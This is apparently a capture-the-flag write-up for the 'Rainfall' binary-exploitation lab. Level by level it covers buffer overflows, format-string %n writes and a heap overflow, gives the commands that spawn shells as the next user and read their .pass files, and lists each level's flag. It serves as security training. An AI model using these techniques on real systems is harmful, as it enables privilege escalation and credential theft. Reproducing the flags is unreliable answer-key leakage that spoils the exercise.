# Rainfall Walkthrough

## Level0:
### Code after RE:
![level0.png](./ressource/level0.png)
### Solution: 
- We can have a shell as level1 by simple providing 423 as the first argument.
- ``./level0 423`` (This spawn a shell as level1 user)\
- ``cat /home/level1/.pass``
### Result:
	1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

## Level1
### Code after RE:
![level1.png](ressource/level1.png)
### Solution:
- There is a function that will execute a shell as level2 but we cant execute it in the normal program flow.
- We see that we can overflow the buffer through the ``gets`` function.
- We craft a payload to change the return address of the ``main`` to the ``run`` function.
- ``python3 ./level1/craft_payload.py && scp -P 4243 ./payload level1@localhost:/tmp/payload``
- ``cat payload | ./level1`` (This spawn a shell as level2 user)
- ``cat /home/level2/.pass``
### Result:
	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
  
## Level2:
### Code after RE:
![level2.png](ressource/level2.png)
### Solution:
- We can overflow the buffer inside the ``p`` function.
- We craft a payload the change the return address of gets to the return inside the ``main`` function.
- We add to the payload the address of the function ``system`` inside the glibc with ``/bin/sh`` as argument.
- ``python3 ./level2/craft_payload.py && scp -P 4243 ./payload level2@localhost:/tmp/payload``
- ``cat payload | ./level2`` (This spawn a shell as level3 user)
- ``cat /home/level3/.pass``
### Result:
    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

## Level3:
### Code after RE:
![level3.png](ressource/level3.png)
### Solution:
- We cant overflow the buffer because they use ``fgets`` function.
- However, we can manipulate the function ``printf`` with the use of a special specifier.
- The ``%n`` specifier will write the number of character printed to the specified variable.
- We craft a payload that will print 0x40 character and then use the ``%n`` specifier to write the result on the ``m`` variable.
- ``python3 ./level3/craft_payload.py && scp -P 4243 ./payload level4@localhost:/tmp/payload``
- ``cat payload | ./level3`` (This spawn a shell as level4 user)
- ``cat /home/level4/.pass``
### Result:
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

## Level4:
### Code after RE:
![level4.png](ressource/level4.png)
### Solution:
- We cant overflow the buffer cause of the ``fgets`` function.
- We can use the same method of the last level to write to the ``m`` var.
- ``python3 ./level4/craft_payload.py && scp -P 4243 ./payload level4@localhost:/tmp/payload``
- ``cat payload | ./level4`` (This call cat on /home/level5/.pass)
### Result:
    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

## Level5:
### Code after RE:
![level5.png](ressource/level5.png)
### Solution:
- We cant overflow the buffer thanks to the ``fgets`` functions.
- We still can use the printf trick to change the return address of the printf call.
- We craft a payload that will change that address to the ``o`` function.
- ``python3 ./level5/craft_payload.py && scp -P 4243 ./payload level5@localhost:/tmp/payload``
- ``cat payload | ./level5`` (This spawn a shell as level6 user)
- ``cat /home/level6/.pass``
### Result:
    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

## Level6:
### Code after RE:
![level6.png](ressource/level6.png)
### Solution:
- We can overflow the ``dest`` buffer through the ``strcpy`` call.
- We don't want that ``fn_ptr`` point to the ``m`` fn.
- We craft a payload that will change the data pointed by fn_ptr to the ``n`` function.
- ``python3 ./level6/craft_payload.py && scp -P 4243 ./payload level6@localhost:/tmp/payload``
- ``cat payload | ./level6``
### Result:
    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

## Level7:
### Code after RE:
![level7.png](ressource/level7.png)
### Solution:
- We can overflow ``array_1`` and ``array_2`` through ``strcpy``.
- Our program think that the function address ``puts`` is located at a given address.
- We will craft a payload that change the pointer at this address to the ``m`` function 
- ``python3 ./level7/craft_payload.py && scp -P 4243 ./payload level7@localhost:/tmp/payload``
- ``./level7 payload1 payload2`` (This print the content of /home/user/level8/.pass)
### Result:
    5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

## Level8:
### Code after RE:
![level8.png](ressource/level8.png)
### Solution:
- We use the command ``auth`` and ``service`` to allocate both pointer.
- Then we run the ``login`` command to access the ``system`` call.
- ``./level08``
- Type ``auth ``
- Type ``service 0123456789abcdef``
- Type ``login`` (This spawn a shell as level9 users)
- ``cat /home/user/level9/.pass``
### Result:
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

## Level9:
### Code after RE:
![level9.png](ressource/level9.png)
### Solution:
- We can overwrite the memory of the two class through the ``setAnnotation`` function which use a dirty ``memcpy``.
- We craft a payload with a shellcode that will call the ``system`` function.
- ``python3 ./level9/craft_payload.py && scp -P 4243 ./payload level9@localhost:/tmp/payload``
- ``./level9 $(cat payload)`` (This spawn a shell as bonus0 user)
- ``cat /home/user/bonus0/.pass``
### Result:
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728


## Bonus0:
### Code after RE:
![bonus0.png](ressource/bonus0.png)
### Solution:
- We can overflow v3 through the function ``p``
- We will craft a shellcode with a lot of NOP operation and a call to ``system("/bin/sh")``
- ``python3 ./bonus0/craft_payload.py && scp -P 4243 ./payload bonus0@localhost:/tmp/payload``
- ``cat /tmp/payload - | ./bonus0 `` (This spawn a shell as bonus01)
- ``cat /home/user/bonus1/.pass``
### Result:
    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

## Bonus1:
### Code aftger RE:
![bonus1.png](ressource/bonus1.png)
### Solution:
- There is a call to ``/bin/sh`` if we meet a certain condition.
- ``v5`` need to overflow so the ``memcpy`` doesn't cause a segfault.
- ``./bonus1 -1073741813 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaFLOW`` (This spawn a shell as bonus02)
- ``cat /home/user/bonus2/.pass``
### Result:
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245


## Bonus2:
### Code aftger RE:
![bonus2.png](ressource/bonus2.png)
### Solution:
- We need the env variable ``LANG`` to be set to ``fi``.
- We craft a payload that will overflow ``dest`` and call ``system("/bin.sh")``
- ``LANG=fi ./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa $(cat /tmp/payload)`` (This spawn a shell as bonus03)
- ``cat /home/user/bonus3/.pass``
### Result:
   71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587


## Bonus3:
### Code aftger RE:
![bonus3.png](ressource/bonus3.png)
### Solution:
- We need to trigger a certain condition to a call to ``system("/bin/sh")``
- Providing nothing will work !
- ``./bonus3 ""`` (This spawn a shell as end)
- ``cat /home/user/bonus4/.pass``
### Result:
    3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c